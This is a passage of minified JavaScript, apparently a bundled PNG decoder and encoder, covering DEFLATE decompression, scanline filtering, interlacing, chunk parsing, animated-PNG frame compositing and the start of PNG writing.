        c = new Uint8Array(4 * s),
        l = new Uint32Array(c.buffer),
        { ctype: d } = o,
        { depth: f } = o,
        h = t.readUshort;
      if (6 == d) {
        const t = s << 2;
        if (8 == f)
          for (var p = 0; p < t; p += 4)
            (c[p] = e[p]),
              (c[p + 1] = e[p + 1]),
              (c[p + 2] = e[p + 2]),
              (c[p + 3] = e[p + 3]);
        if (16 == f) for (p = 0; p < t; p++) c[p] = e[p << 1];
      } else if (2 == d) {
        const t = o.tabs.tRNS;
        if (null == t) {
          if (8 == f)
            for (p = 0; p < s; p++) {
              var m = 3 * p;
              l[p] = (255 << 24) | (e[m + 2] << 16) | (e[m + 1] << 8) | e[m];
            }
          if (16 == f)
            for (p = 0; p < s; p++)
              (m = 6 * p),
                (l[p] =
                  (255 << 24) | (e[m + 4] << 16) | (e[m + 2] << 8) | e[m]);
        } else {
          var g = t[0];
          const n = t[1],
            r = t[2];
          if (8 == f)
            for (p = 0; p < s; p++) {
              var y = p << 2;
              (m = 3 * p),
                (l[p] =
                  (255 << 24) | (e[m + 2] << 16) | (e[m + 1] << 8) | e[m]),
                e[m] == g && e[m + 1] == n && e[m + 2] == r && (c[y + 3] = 0);
            }
          if (16 == f)
            for (p = 0; p < s; p++)
              (y = p << 2),
                (m = 6 * p),
                (l[p] =
                  (255 << 24) | (e[m + 4] << 16) | (e[m + 2] << 8) | e[m]),
                h(e, m) == g &&
                  h(e, m + 2) == n &&
                  h(e, m + 4) == r &&
                  (c[y + 3] = 0);
        }
      } else if (3 == d) {
        const t = o.tabs.PLTE,
          i = o.tabs.tRNS,
          a = i ? i.length : 0;
        if (1 == f)
          for (var w = 0; w < r; w++) {
            var b = w * u,
              v = w * n;
            for (p = 0; p < n; p++) {
              y = (v + p) << 2;
              var A = 3 * (k = (e[b + (p >> 3)] >> (7 - (7 & p))) & 1);
              (c[y] = t[A]),
                (c[y + 1] = t[A + 1]),
                (c[y + 2] = t[A + 2]),
                (c[y + 3] = k < a ? i[k] : 255);
            }
          }
        if (2 == f)
          for (w = 0; w < r; w++)
            for (b = w * u, v = w * n, p = 0; p < n; p++)
              (y = (v + p) << 2),
                (A = 3 * (k = (e[b + (p >> 2)] >> (6 - ((3 & p) << 1))) & 3)),
                (c[y] = t[A]),
                (c[y + 1] = t[A + 1]),
                (c[y + 2] = t[A + 2]),
                (c[y + 3] = k < a ? i[k] : 255);
        if (4 == f)
          for (w = 0; w < r; w++)
            for (b = w * u, v = w * n, p = 0; p < n; p++)
              (y = (v + p) << 2),
                (A = 3 * (k = (e[b + (p >> 1)] >> (4 - ((1 & p) << 2))) & 15)),
                (c[y] = t[A]),
                (c[y + 1] = t[A + 1]),
                (c[y + 2] = t[A + 2]),
                (c[y + 3] = k < a ? i[k] : 255);
        if (8 == f)
          for (p = 0; p < s; p++) {
            var k;
            (y = p << 2),
              (A = 3 * (k = e[p])),
              (c[y] = t[A]),
              (c[y + 1] = t[A + 1]),
              (c[y + 2] = t[A + 2]),
              (c[y + 3] = k < a ? i[k] : 255);
          }
      } else if (4 == d) {
        if (8 == f)
          for (p = 0; p < s; p++) {
            y = p << 2;
            var I = e[(S = p << 1)];
            (c[y] = I), (c[y + 1] = I), (c[y + 2] = I), (c[y + 3] = e[S + 1]);
          }
        if (16 == f)
          for (p = 0; p < s; p++) {
            var S;
            (y = p << 2),
              (I = e[(S = p << 2)]),
              (c[y] = I),
              (c[y + 1] = I),
              (c[y + 2] = I),
              (c[y + 3] = e[S + 2]);
          }
      } else if (0 == d)
        for (g = o.tabs.tRNS ? o.tabs.tRNS : -1, w = 0; w < r; w++) {
          const t = w * u,
            r = w * n;
          if (1 == f)
            for (var _ = 0; _ < n; _++) {
              var T =
                (I = 255 * ((e[t + (_ >>> 3)] >>> (7 - (7 & _))) & 1)) ==
                255 * g
                  ? 0
                  : 255;
              l[r + _] = (T << 24) | (I << 16) | (I << 8) | I;
            }
          else if (2 == f)
            for (_ = 0; _ < n; _++)
              (T =
                (I = 85 * ((e[t + (_ >>> 2)] >>> (6 - ((3 & _) << 1))) & 3)) ==
                85 * g
                  ? 0
                  : 255),
                (l[r + _] = (T << 24) | (I << 16) | (I << 8) | I);
          else if (4 == f)
            for (_ = 0; _ < n; _++)
              (T =
                (I = 17 * ((e[t + (_ >>> 1)] >>> (4 - ((1 & _) << 2))) & 15)) ==
                17 * g
                  ? 0
                  : 255),
                (l[r + _] = (T << 24) | (I << 16) | (I << 8) | I);
          else if (8 == f)
            for (_ = 0; _ < n; _++)
              (T = (I = e[t + _]) == g ? 0 : 255),
                (l[r + _] = (T << 24) | (I << 16) | (I << 8) | I);
          else if (16 == f)
            for (_ = 0; _ < n; _++)
              (I = e[t + (_ << 1)]),
                (T = h(e, t + (_ << 1)) == g ? 0 : 255),
                (l[r + _] = (T << 24) | (I << 16) | (I << 8) | I);
        }
      return c;
    }
    function n(t, e, n, a) {
      const u = i(t),
        c = Math.ceil((n * u) / 8),
        l = new Uint8Array((c + 1 + t.interlace) * a);
      return (
        (e = t.tabs.CgBI ? o(e, l) : r(e, l)),
        0 == t.interlace
          ? (e = s(e, t, 0, n, a))
          : 1 == t.interlace &&
            (e = (function (t, e) {
              const n = e.width,
                r = e.height,
                o = i(e),
                a = o >> 3,
                u = Math.ceil((n * o) / 8),
                c = new Uint8Array(r * u);
              let l = 0;
              const d = [0, 0, 4, 0, 2, 0, 1],
                f = [0, 4, 0, 2, 0, 1, 0],
                h = [8, 8, 8, 4, 4, 2, 2],
                p = [8, 8, 4, 4, 2, 2, 1];
              let m = 0;
              for (; m < 7; ) {
                const i = h[m],
                  y = p[m];
                let w = 0,
                  b = 0,
                  v = d[m];
                for (; v < r; ) (v += i), b++;
                let A = f[m];
                for (; A < n; ) (A += y), w++;
                const k = Math.ceil((w * o) / 8);
                s(t, e, l, w, b);
                let I = 0,
                  S = d[m];
                for (; S < r; ) {
                  let e = f[m],
                    r = (l + I * k) << 3;
                  for (; e < n; ) {
                    var g;
                    if (
                      (1 == o &&
                        ((g = ((g = t[r >> 3]) >> (7 - (7 & r))) & 1),
                        (c[S * u + (e >> 3)] |= g << (7 - (7 & e)))),
                      2 == o &&
                        ((g = ((g = t[r >> 3]) >> (6 - (7 & r))) & 3),
                        (c[S * u + (e >> 2)] |= g << (6 - ((3 & e) << 1)))),
                      4 == o &&
                        ((g = ((g = t[r >> 3]) >> (4 - (7 & r))) & 15),
                        (c[S * u + (e >> 1)] |= g << (4 - ((1 & e) << 2)))),
                      o >= 8)
                    ) {
                      const n = S * u + e * a;
                      for (let e = 0; e < a; e++) c[n + e] = t[(r >> 3) + e];
                    }
                    (r += o), (e += y);
                  }
                  I++, (S += i);
                }
                w * b != 0 && (l += b * (1 + k)), (m += 1);
              }
              return c;
            })(e, t)),
        e
      );
    }
    function r(t, e) {
      return o(new Uint8Array(t.buffer, 2, t.length - 6), e);
    }
    var o = (function () {
      const t = { H: {} };
      return (
        (t.H.N = function (e, n) {
          const r = Uint8Array;
          let o,
            i,
            s = 0,
            a = 0,
            u = 0,
            c = 0,
            l = 0,
            d = 0,
            f = 0,
            h = 0,
            p = 0;
          if (3 == e[0] && 0 == e[1]) return n || new r(0);
          const m = t.H,
            g = m.b,
            y = m.e,
            w = m.R,
            b = m.n,
            v = m.A,
            A = m.Z,
            k = m.m,
            I = null == n;
          for (I && (n = new r((e.length >>> 2) << 5)); 0 == s; )
            if (((s = g(e, p, 1)), (a = g(e, p + 1, 2)), (p += 3), 0 != a)) {
              if (
                (I && (n = t.H.W(n, h + (1 << 17))),
                1 == a && ((o = k.J), (i = k.h), (d = 511), (f = 31)),
                2 == a)
              ) {
                (u = y(e, p, 5) + 257),
                  (c = y(e, p + 5, 5) + 1),
                  (l = y(e, p + 10, 4) + 4),
                  (p += 14);
                let t = 1;
                for (var S = 0; S < 38; S += 2) (k.Q[S] = 0), (k.Q[S + 1] = 0);
                for (S = 0; S < l; S++) {
                  const n = y(e, p + 3 * S, 3);
                  (k.Q[1 + (k.X[S] << 1)] = n), n > t && (t = n);
                }
                (p += 3 * l),
                  b(k.Q, t),
                  v(k.Q, t, k.u),
                  (o = k.w),
                  (i = k.d),
                  (p = w(k.u, (1 << t) - 1, u + c, e, p, k.v));
                const n = m.V(k.v, 0, u, k.C);
                d = (1 << n) - 1;
                const r = m.V(k.v, u, c, k.D);
                (f = (1 << r) - 1),
                  b(k.C, n),
                  v(k.C, n, o),
                  b(k.D, r),
                  v(k.D, r, i);
              }
              for (;;) {
                const t = o[A(e, p) & d];
                p += 15 & t;
                const r = t >>> 4;
                if (r >>> 8 == 0) n[h++] = r;
                else {
                  if (256 == r) break;
                  {
                    let t = h + r - 254;
                    if (r > 264) {
                      const n = k.q[r - 257];
                      (t = h + (n >>> 3) + y(e, p, 7 & n)), (p += 7 & n);
                    }
                    const o = i[A(e, p) & f];
                    p += 15 & o;
                    const s = o >>> 4,
                      a = k.c[s],
                      u = (a >>> 4) + g(e, p, 15 & a);
                    for (p += 15 & a; h < t; )
                      (n[h] = n[h++ - u]),
                        (n[h] = n[h++ - u]),
                        (n[h] = n[h++ - u]),
                        (n[h] = n[h++ - u]);
                    h = t;
                  }
                }
              }
            } else {
              7 & p && (p += 8 - (7 & p));
              const o = 4 + (p >>> 3),
                i = e[o - 4] | (e[o - 3] << 8);
              I && (n = t.H.W(n, h + i)),
                n.set(new r(e.buffer, e.byteOffset + o, i), h),
                (p = (o + i) << 3),
                (h += i);
            }
          return n.length == h ? n : n.slice(0, h);
        }),
        (t.H.W = function (t, e) {
          const n = t.length;
          if (e <= n) return t;
          const r = new Uint8Array(n << 1);
          return r.set(t, 0), r;
        }),
        (t.H.R = function (e, n, r, o, i, s) {
          const a = t.H.e,
            u = t.H.Z;
          let c = 0;
          for (; c < r; ) {
            const t = e[u(o, i) & n];
            i += 15 & t;
            const r = t >>> 4;
            if (r <= 15) (s[c] = r), c++;
            else {
              let t = 0,
                e = 0;
              16 == r
                ? ((e = 3 + a(o, i, 2)), (i += 2), (t = s[c - 1]))
                : 17 == r
                ? ((e = 3 + a(o, i, 3)), (i += 3))
                : 18 == r && ((e = 11 + a(o, i, 7)), (i += 7));
              const n = c + e;
              for (; c < n; ) (s[c] = t), c++;
            }
          }
          return i;
        }),
        (t.H.V = function (t, e, n, r) {
          let o = 0,
            i = 0;
          const s = r.length >>> 1;
          for (; i < n; ) {
            const n = t[i + e];
            (r[i << 1] = 0), (r[1 + (i << 1)] = n), n > o && (o = n), i++;
          }
          for (; i < s; ) (r[i << 1] = 0), (r[1 + (i << 1)] = 0), i++;
          return o;
        }),
        (t.H.n = function (e, n) {
          const r = t.H.m,
            o = e.length;
          let i, s, a, u;
          const c = r.j;
          for (var l = 0; l <= n; l++) c[l] = 0;
          for (l = 1; l < o; l += 2) c[e[l]]++;
          const d = r.K;
          for (i = 0, c[0] = 0, s = 1; s <= n; s++)
            (i = (i + c[s - 1]) << 1), (d[s] = i);
          for (a = 0; a < o; a += 2)
            (u = e[a + 1]), 0 != u && ((e[a] = d[u]), d[u]++);
        }),
        (t.H.A = function (e, n, r) {
          const o = e.length,
            i = t.H.m.r;
          for (let t = 0; t < o; t += 2)
            if (0 != e[t + 1]) {
              const o = t >> 1,
                s = e[t + 1],
                a = (o << 4) | s,
                u = n - s;
              let c = e[t] << u;
              const l = c + (1 << u);
              for (; c != l; ) (r[i[c] >>> (15 - n)] = a), c++;
            }
        }),
        (t.H.l = function (e, n) {
          const r = t.H.m.r,
            o = 15 - n;
          for (let t = 0; t < e.length; t += 2) {
            const i = e[t] << (n - e[t + 1]);
            e[t] = r[i] >>> o;
          }
        }),
        (t.H.M = function (t, e, n) {
          n <<= 7 & e;
          const r = e >>> 3;
          (t[r] |= n), (t[r + 1] |= n >>> 8);
        }),
        (t.H.I = function (t, e, n) {
          n <<= 7 & e;
          const r = e >>> 3;
          (t[r] |= n), (t[r + 1] |= n >>> 8), (t[r + 2] |= n >>> 16);
        }),
        (t.H.e = function (t, e, n) {
          return (
            ((t[e >>> 3] | (t[1 + (e >>> 3)] << 8)) >>> (7 & e)) &
            ((1 << n) - 1)
          );
        }),
        (t.H.b = function (t, e, n) {
          return (
            ((t[e >>> 3] |
              (t[1 + (e >>> 3)] << 8) |
              (t[2 + (e >>> 3)] << 16)) >>>
              (7 & e)) &
            ((1 << n) - 1)
          );
        }),
        (t.H.Z = function (t, e) {
          return (
            (t[e >>> 3] |
              (t[1 + (e >>> 3)] << 8) |
              (t[2 + (e >>> 3)] << 16)) >>>
            (7 & e)
          );
        }),
        (t.H.i = function (t, e) {
          return (
            (t[e >>> 3] |
              (t[1 + (e >>> 3)] << 8) |
              (t[2 + (e >>> 3)] << 16) |
              (t[3 + (e >>> 3)] << 24)) >>>
            (7 & e)
          );
        }),
        (t.H.m = (function () {
          const t = Uint16Array,
            e = Uint32Array;
          return {
            K: new t(16),
            j: new t(16),
            X: [
              16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15,
            ],
            S: [
              3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 15, 17, 19, 23, 27, 31, 35, 43,
              51, 59, 67, 83, 99, 115, 131, 163, 195, 227, 258, 999, 999, 999,
            ],
            T: [
              0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 2, 2, 2, 2, 3, 3, 3, 3, 4, 4,
              4, 4, 5, 5, 5, 5, 0, 0, 0, 0,
            ],
            q: new t(32),
            p: [
              1, 2, 3, 4, 5, 7, 9, 13, 17, 25, 33, 49, 65, 97, 129, 193, 257,
              385, 513, 769, 1025, 1537, 2049, 3073, 4097, 6145, 8193, 12289,
              16385, 24577, 65535, 65535,
            ],
            z: [
              0, 0, 0, 0, 1, 1, 2, 2, 3, 3, 4, 4, 5, 5, 6, 6, 7, 7, 8, 8, 9, 9,
              10, 10, 11, 11, 12, 12, 13, 13, 0, 0,
            ],
            c: new e(32),
            J: new t(512),
            _: [],
            h: new t(32),
            $: [],
            w: new t(32768),
            C: [],
            v: [],
            d: new t(32768),
            D: [],
            u: new t(512),
            Q: [],
            r: new t(32768),
            s: new e(286),
            Y: new e(30),
            a: new e(19),
            t: new e(15e3),
            k: new t(65536),
            g: new t(32768),
          };
        })()),
        (function () {
          const e = t.H.m;
          for (var n = 0; n < 32768; n++) {
            let t = n;
            (t = ((2863311530 & t) >>> 1) | ((1431655765 & t) << 1)),
              (t = ((3435973836 & t) >>> 2) | ((858993459 & t) << 2)),
              (t = ((4042322160 & t) >>> 4) | ((252645135 & t) << 4)),
              (t = ((4278255360 & t) >>> 8) | ((16711935 & t) << 8)),
              (e.r[n] = ((t >>> 16) | (t << 16)) >>> 17);
          }
          function r(t, e, n) {
            for (; 0 != e--; ) t.push(0, n);
          }
          for (n = 0; n < 32; n++)
            (e.q[n] = (e.S[n] << 3) | e.T[n]),
              (e.c[n] = (e.p[n] << 4) | e.z[n]);
          r(e._, 144, 8),
            r(e._, 112, 9),
            r(e._, 24, 7),
            r(e._, 8, 8),
            t.H.n(e._, 9),
            t.H.A(e._, 9, e.J),
            t.H.l(e._, 9),
            r(e.$, 32, 5),
            t.H.n(e.$, 5),
            t.H.A(e.$, 5, e.h),
            t.H.l(e.$, 5),
            r(e.Q, 19, 0),
            r(e.C, 286, 0),
            r(e.D, 30, 0),
            r(e.v, 320, 0);
        })(),
        t.H.N
      );
    })();
    function i(t) {
      return [1, null, 3, 1, 2, null, 4][t.ctype] * t.depth;
    }
    function s(t, e, n, r, o) {
      let s = i(e);
      const u = Math.ceil((r * s) / 8);
      let c, l;
      s = Math.ceil(s / 8);
      let d = t[n],
        f = 0;
      if ((d > 1 && (t[n] = [0, 0, 1][d - 2]), 3 == d))
        for (f = s; f < u; f++)
          t[f + 1] = (t[f + 1] + (t[f + 1 - s] >>> 1)) & 255;
      for (let i = 0; i < o; i++)
        if (((c = n + i * u), (l = c + i + 1), (d = t[l - 1]), (f = 0), 0 == d))
          for (; f < u; f++) t[c + f] = t[l + f];
        else if (1 == d) {
          for (; f < s; f++) t[c + f] = t[l + f];
          for (; f < u; f++) t[c + f] = t[l + f] + t[c + f - s];
        } else if (2 == d)
          for (; f < u; f++) t[c + f] = t[l + f] + t[c + f - u];
        else if (3 == d) {
          for (; f < s; f++) t[c + f] = t[l + f] + (t[c + f - u] >>> 1);
          for (; f < u; f++)
            t[c + f] = t[l + f] + ((t[c + f - u] + t[c + f - s]) >>> 1);
        } else {
          for (; f < s; f++) t[c + f] = t[l + f] + a(0, t[c + f - u], 0);
          for (; f < u; f++)
            t[c + f] =
              t[l + f] + a(t[c + f - s], t[c + f - u], t[c + f - s - u]);
        }
      return t;
    }
    function a(t, e, n) {
      const r = t + e - n,
        o = r - t,
        i = r - e,
        s = r - n;
      return o * o <= i * i && o * o <= s * s ? t : i * i <= s * s ? e : n;
    }
    function u(e, n, r) {
      (r.width = t.readUint(e, n)),
        (n += 4),
        (r.height = t.readUint(e, n)),
        (n += 4),
        (r.depth = e[n]),
        n++,
        (r.ctype = e[n]),
        n++,
        (r.compress = e[n]),
        n++,
        (r.filter = e[n]),
        n++,
        (r.interlace = e[n]),
        n++;
    }
    function c(t, e, n, r, o, i, s, a, u) {
      const c = Math.min(e, o),
        l = Math.min(n, i);
      let d = 0,
        f = 0;
      for (let A = 0; A < l; A++)
        for (let n = 0; n < c; n++)
          if (
            (s >= 0 && a >= 0
              ? ((d = (A * e + n) << 2), (f = ((a + A) * o + s + n) << 2))
              : ((d = ((-a + A) * e - s + n) << 2), (f = (A * o + n) << 2)),
            0 == u)
          )
            (r[f] = t[d]),
              (r[f + 1] = t[d + 1]),
              (r[f + 2] = t[d + 2]),
              (r[f + 3] = t[d + 3]);
          else if (1 == u) {
            var h = t[d + 3] * (1 / 255),
              p = t[d] * h,
              m = t[d + 1] * h,
              g = t[d + 2] * h,
              y = r[f + 3] * (1 / 255),
              w = r[f] * y,
              b = r[f + 1] * y,
              v = r[f + 2] * y;
            const e = 1 - h,
              n = h + y * e,
              o = 0 == n ? 0 : 1 / n;
            (r[f + 3] = 255 * n),
              (r[f + 0] = (p + w * e) * o),
              (r[f + 1] = (m + b * e) * o),
              (r[f + 2] = (g + v * e) * o);
          } else if (2 == u)
            (h = t[d + 3]),
              (p = t[d]),
              (m = t[d + 1]),
              (g = t[d + 2]),
              (y = r[f + 3]),
              (w = r[f]),
              (b = r[f + 1]),
              (v = r[f + 2]),
              h == y && p == w && m == b && g == v
                ? ((r[f] = 0), (r[f + 1] = 0), (r[f + 2] = 0), (r[f + 3] = 0))
                : ((r[f] = p), (r[f + 1] = m), (r[f + 2] = g), (r[f + 3] = h));
          else if (3 == u) {
            if (
              ((h = t[d + 3]),
              (p = t[d]),
              (m = t[d + 1]),
              (g = t[d + 2]),
              (y = r[f + 3]),
              (w = r[f]),
              (b = r[f + 1]),
              (v = r[f + 2]),
              h == y && p == w && m == b && g == v)
            )
              continue;
            if (h < 220 && y > 20) return !1;
          }
      return !0;
    }
    return {
      decode: function (e) {
        const i = new Uint8Array(e);
        let s = 8;
        const a = t,
          c = a.readUshort,
          l = a.readUint,
          d = { tabs: {}, frames: [] },
          f = new Uint8Array(i.length);
        let h,
          p = 0,
          m = 0;
        const g = [137, 80, 78, 71, 13, 10, 26, 10];
        for (var y = 0; y < 8; y++)
          if (i[y] != g[y]) throw "The input is not a PNG file!";
        for (; s < i.length; ) {
          const t = a.readUint(i, s);
          s += 4;
          const e = a.readASCII(i, s, 4);
          if (((s += 4), "IHDR" == e)) u(i, s, d);
          else if ("iCCP" == e) {
            for (var w = s; 0 != i[w]; ) w++;
            a.readASCII(i, s, w - s), i[w + 1];
            const n = i.slice(w + 2, s + t);
            let u = null;
            try {
              u = r(n);
            } catch (_) {
              u = o(n);
            }
            d.tabs[e] = u;
          } else if ("CgBI" == e) d.tabs[e] = i.slice(s, s + 4);
          else if ("IDAT" == e) {
            for (y = 0; y < t; y++) f[p + y] = i[s + y];
            p += t;
          } else if ("acTL" == e)
            (d.tabs[e] = { num_frames: l(i, s), num_plays: l(i, s + 4) }),
              (h = new Uint8Array(i.length));
          else if ("fcTL" == e) {
            0 != m &&
              (((S = d.frames[d.frames.length - 1]).data = n(
                d,
                h.slice(0, m),
                S.rect.width,
                S.rect.height
              )),
              (m = 0));
            const t = {
              x: l(i, s + 12),
              y: l(i, s + 16),
              width: l(i, s + 4),
              height: l(i, s + 8),
            };
            let e = c(i, s + 22);
            e = c(i, s + 20) / (0 == e ? 100 : e);
            const r = {
              rect: t,
              delay: Math.round(1e3 * e),
              dispose: i[s + 24],
              blend: i[s + 25],
            };
            d.frames.push(r);
          } else if ("fdAT" == e) {
            for (y = 0; y < t - 4; y++) h[m + y] = i[s + y + 4];
            m += t - 4;
          } else if ("pHYs" == e)
            d.tabs[e] = [a.readUint(i, s), a.readUint(i, s + 4), i[s + 8]];
          else if ("cHRM" == e)
            for (d.tabs[e] = [], y = 0; y < 8; y++)
              d.tabs[e].push(a.readUint(i, s + 4 * y));
          else if ("tEXt" == e || "zTXt" == e) {
            null == d.tabs[e] && (d.tabs[e] = {});
            var b = a.nextZero(i, s),
              v = a.readASCII(i, s, b - s),
              A = s + t - b - 1;
            if ("tEXt" == e) I = a.readASCII(i, b + 1, A);
            else {
              var k = r(i.slice(b + 2, b + 2 + A));
              I = a.readUTF8(k, 0, k.length);
            }
            d.tabs[e][v] = I;
          } else if ("iTXt" == e) {
            null == d.tabs[e] && (d.tabs[e] = {}),
              (b = 0),
              (w = s),
              (b = a.nextZero(i, w)),
              (v = a.readASCII(i, w, b - w));
            const n = i[(w = b + 1)];
            var I;
            i[w + 1],
              (w += 2),
              (b = a.nextZero(i, w)),
              a.readASCII(i, w, b - w),
              (w = b + 1),
              (b = a.nextZero(i, w)),
              a.readUTF8(i, w, b - w),
              (A = t - ((w = b + 1) - s)),
              0 == n
                ? (I = a.readUTF8(i, w, A))
                : ((k = r(i.slice(w, w + A))),
                  (I = a.readUTF8(k, 0, k.length))),
              (d.tabs[e][v] = I);
          } else if ("PLTE" == e) d.tabs[e] = a.readBytes(i, s, t);
          else if ("hIST" == e) {
            const t = d.tabs.PLTE.length / 3;
            for (d.tabs[e] = [], y = 0; y < t; y++)
              d.tabs[e].push(c(i, s + 2 * y));
          } else if ("tRNS" == e)
            3 == d.ctype
              ? (d.tabs[e] = a.readBytes(i, s, t))
              : 0 == d.ctype
              ? (d.tabs[e] = c(i, s))
              : 2 == d.ctype &&
                (d.tabs[e] = [c(i, s), c(i, s + 2), c(i, s + 4)]);
          else if ("gAMA" == e) d.tabs[e] = a.readUint(i, s) / 1e5;
          else if ("sRGB" == e) d.tabs[e] = i[s];
          else if ("bKGD" == e)
            0 == d.ctype || 4 == d.ctype
              ? (d.tabs[e] = [c(i, s)])
              : 2 == d.ctype || 6 == d.ctype
              ? (d.tabs[e] = [c(i, s), c(i, s + 2), c(i, s + 4)])
              : 3 == d.ctype && (d.tabs[e] = i[s]);
          else if ("IEND" == e) break;
          (s += t), a.readUint(i, s), (s += 4);
        }
        var S;
        return (
          0 != m &&
            ((S = d.frames[d.frames.length - 1]).data = n(
              d,
              h.slice(0, m),
              S.rect.width,
              S.rect.height
            )),
          (d.data = n(d, f, d.width, d.height)),
          delete d.compress,
          delete d.interlace,
          delete d.filter,
          d
        );
      },
      toRGBA8: function (t) {
        const n = t.width,
          r = t.height;
        if (null == t.tabs.acTL) return [e(t.data, n, r, t).buffer];
        const o = [];
        null == t.frames[0].data && (t.frames[0].data = t.data);
        const i = n * r * 4,
          s = new Uint8Array(i),
          a = new Uint8Array(i),
          u = new Uint8Array(i);
        for (let d = 0; d < t.frames.length; d++) {
          const f = t.frames[d],
            h = f.rect.x,
            p = f.rect.y,
            m = f.rect.width,
            g = f.rect.height,
            y = e(f.data, m, g, t);
          if (0 != d) for (var l = 0; l < i; l++) u[l] = s[l];
          if (
            (0 == f.blend
              ? c(y, m, g, s, n, r, h, p, 0)
              : 1 == f.blend && c(y, m, g, s, n, r, h, p, 1),
            o.push(s.buffer.slice(0)),
            0 == f.dispose)
          );
          else if (1 == f.dispose) c(a, m, g, s, n, r, h, p, 0);
          else if (2 == f.dispose) for (l = 0; l < i; l++) s[l] = u[l];
        }
        return o;
      },
      _paeth: a,
      _copyTile: c,
      _bin: t,
    };
  })();
  !(function () {
    const { _copyTile: t } = tR,
      { _bin: e } = tR,
      n = tR._paeth;
    var r = {
      table: (function () {
        const t = new Uint32Array(256);
        for (let e = 0; e < 256; e++) {
          let n = e;
          for (let t = 0; t < 8; t++)
            1 & n ? (n = 3988292384 ^ (n >>> 1)) : (n >>>= 1);
          t[e] = n;
        }
        return t;
      })(),
      update(t, e, n, o) {
        for (let i = 0; i < o; i++)
          t = r.table[255 & (t ^ e[n + i])] ^ (t >>> 8);
        return t;
      },
      crc: (t, e, n) => 4294967295 ^ r.update(4294967295, t, e, n),
    };
    function o(t, e, n, r) {
      (e[n] += (t[0] * r) >> 4),
        (e[n + 1] += (t[1] * r) >> 4),
        (e[n + 2] += (t[2] * r) >> 4),
        (e[n + 3] += (t[3] * r) >> 4);
    }
    function i(t) {
      return Math.max(0, Math.min(255, t));
    }
    function s(t, e) {
      const n = t[0] - e[0],
        r = t[1] - e[1],
        o = t[2] - e[2],
        i = t[3] - e[3];
      return n * n + r * r + o * o + i * i;
    }
    function a(t, e, n, r, a, u, c) {
      null == c && (c = 1);
      const l = r.length,
        d = [];
      for (var f = 0; f < l; f++) {
        const t = r[f];
        d.push([
          (t >>> 0) & 255,
          (t >>> 8) & 255,
          (t >>> 16) & 255,
          (t >>> 24) & 255,
        ]);
      }
      for (f = 0; f < l; f++) {
        let t = 4294967295;
        for (var h = 0, p = 0; p < l; p++) {
          var m = s(d[f], d[p]);
          p != f && m < t && ((t = m), (h = p));
        }
      }
      const g = new Uint32Array(a.buffer),
        y = new Int16Array(e * n * 4),
        w = [0, 8, 2, 10, 12, 4, 14, 6, 3, 11, 1, 9, 15, 7, 13, 5];
      for (f = 0; f < w.length; f++) w[f] = 255 * ((w[f] + 0.5) / 16 - 0.5);
      for (let v = 0; v < n; v++)
        for (let a = 0; a < e; a++) {
          var b;
          (f = 4 * (v * e + a)),
            2 != c
              ? (b = [
                  i(t[f] + y[f]),
                  i(t[f + 1] + y[f + 1]),
                  i(t[f + 2] + y[f + 2]),
                  i(t[f + 3] + y[f + 3]),
                ])
              : ((m = w[4 * (3 & v) + (3 & a)]),
                (b = [
                  i(t[f] + m),
                  i(t[f + 1] + m),
                  i(t[f + 2] + m),
                  i(t[f + 3] + m),
                ])),
            (h = 0);
          let A = 16777215;
          for (p = 0; p < l; p++) {
            const t = s(b, d[p]);
            t < A && ((A = t), (h = p));
          }
          const k = d[h],
            I = [b[0] - k[0], b[1] - k[1], b[2] - k[2], b[3] - k[3]];
          1 == c &&
            (a != e - 1 && o(I, y, f + 4, 7),
            v != n - 1 &&
              (0 != a && o(I, y, f + 4 * e - 4, 3),
              o(I, y, f + 4 * e, 5),
              a != e - 1 && o(I, y, f + 4 * e + 4, 1))),
            (u[f >> 2] = h),
            (g[f >> 2] = r[h]);
        }
    }
    function u(t, n, o, i, s) {
      null == s && (s = {});
      const { crc: a } = r,
        u = e.writeUint,
        c = e.writeUshort,
        l = e.writeASCII;
      let d = 8;
      const f = t.frames.length > 1;
      let h,
        p = !1,
        m = 33 + (f ? 20 : 0);
      if (
        (null != s.sRGB && (m += 13),
        null != s.pHYs && (m += 21),
        null != s.iCCP &&
          ((h = pako.deflate(s.iCCP)), (m += 21 + h.length + 4)),
        3 == t.ctype)
      ) {
        for (var g = t.plte.length, y = 0; y < g; y++)
          t.plte[y] >>> 24 != 255 && (p = !0);
        m += 8 + 3 * g + 4 + (p ? 8 + 1 * g + 4 : 0);
      }
      for (var w = 0; w < t.frames.length; w++)
        f && (m += 38),
          (m += (k = t.frames[w]).cimg.length + 12),
          0 != w && (m += 4);
      m += 12;
      const b = new Uint8Array(m),
        v = [137, 80, 78, 71, 13, 10, 26, 10];
      for (y = 0; y < 8; y++) b[y] = v[y];
      if (
        (u(b, d, 13),
        (d += 4),
        l(b, d, "IHDR"),
        (d += 4),
        u(b, d, n),
        (d += 4),
        u(b, d, o),
        (d += 4),
        (b[d] = t.depth),
        d++,
        (b[d] = t.ctype),
        d++,
        (b[d] = 0),
        d++,
        (b[d] = 0),
        d++,
        (b[d] = 0),
        d++,
        u(b, d, a(b, d - 17, 17)),
        (d += 4),
        null != s.sRGB &&
          (u(b, d, 1),
          (d += 4),
          l(b, d, "sRGB"),
          (d += 4),
          (b[d] = s.sRGB),
          d++,
          u(b, d, a(b, d - 5, 5)),
          (d += 4)),
        null != s.iCCP)
      ) {
        const t = 13 + h.length;
        u(b, d, t),
          (d += 4),
          l(b, d, "iCCP"),
          (d += 4),
          l(b, d, "ICC profile"),
          (d += 11),
          (d += 2),
          b.set(h, d),
          (d += h.length),
          u(b, d, a(b, d - (t + 4), t + 4)),
          (d += 4);
      }
      if (
        (null != s.pHYs &&
          (u(b, d, 9),
          (d += 4),
          l(b, d, "pHYs"),
          (d += 4),
          u(b, d, s.pHYs[0]),
          (d += 4),
          u(b, d, s.pHYs[1]),
          (d += 4),
          (b[d] = s.pHYs[2]),
          d++,
          u(b, d, a(b, d - 13, 13)),
          (d += 4)),
        f &&
          (u(b, d, 8),
          (d += 4),
          l(b, d, "acTL"),
          (d += 4),
          u(b, d, t.frames.length),
          (d += 4),
          u(b, d, null != s.loop ? s.loop : 0),
          (d += 4),
          u(b, d, a(b, d - 12, 12)),
          (d += 4)),
        3 == t.ctype)
      ) {
        for (
          u(b, d, 3 * (g = t.plte.length)),
            d += 4,
            l(b, d, "PLTE"),
            d += 4,
            y = 0;
          y < g;
          y++
        ) {
